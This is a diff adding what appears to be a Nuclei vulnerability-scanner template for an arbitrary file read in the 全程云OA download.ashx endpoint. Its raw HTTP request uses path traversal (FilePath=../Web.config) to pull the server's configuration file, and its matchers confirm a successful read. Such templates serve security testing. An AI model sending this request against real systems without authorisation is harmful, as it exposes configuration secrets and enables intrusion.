@@ -1,0 +1,37 @@
+id: eqqccd-download-fileread
+info:
+  name: 全程云OA download.ashx存在任意文件读取
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://bdziyi.com/66682/
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: eqcccd,fileread
+
+http:
+  - raw:
+      - |
+        GET /OA/SMS/download.ashx?FilePath=../Web.config HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/plain, */*
+        projectType: 4
+        Accept-Encoding: gzip, deflate
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:149.0) Gecko/20100101 Firefox/149.0
+        response-lang: chinese
+        Api-Version: 2.0.0
+        Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'xml version','configuration')
+        condition: and
